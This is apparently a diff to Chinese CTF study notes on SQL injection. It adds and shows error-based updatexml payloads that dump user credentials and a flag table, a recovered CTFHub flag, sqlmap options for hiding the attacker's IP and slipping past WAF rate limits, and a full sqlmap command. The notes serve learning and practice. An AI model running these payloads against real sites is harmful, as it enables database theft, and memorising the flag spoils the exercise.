@@ -72,6 +72,12 @@ payload:`username=1' and updatexml(1,concat(0x7e,(select group_concat(table_name
 
 `username=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users)),0) or '`
 
+
+
+显示不全就payload:`-1 or updatexml(1,concat(0x7e,substr((select flag from flag),1,30)),0)#`
+
+ctfhub{bac7527d09610242e52c2cc8}
+
 ### delete注入
 
 `id=56+and+updatexml(1,+concat(0x7e,database()),1)`,这个是get请求，空格使用+表示
@@ -216,3 +222,9 @@ payload:`name=1%df' or 1=1#`
 | `--proxy`    | 无   | 通过代理服务器进行注入（如 `--proxy http://127.0.0.1:8080`），隐藏自身 IP，同时可配合 Burp Suite 抓包分析 |
 | `--delay`    | 无   | 设置请求延迟时间（如 `--delay 2` 每次请求间隔 2 秒），避免请求过于频繁被 WAF 拦截 |
 | `--safe-url` | 无   | 指定安全 URL，每隔一定请求数访问一次安全 URL，模拟正常浏览行为，绕过 WAF 的频率检测 |
+
+还有一点，对于cookie注入需要-level 2  UA和Referer需要-level3
+
+将抓包获取的数据复制放入1.txt 对注入点标*
+
+命令是：`python2 sqlmap.py -r "1.txt" --dbms mysql --current-db --batch`
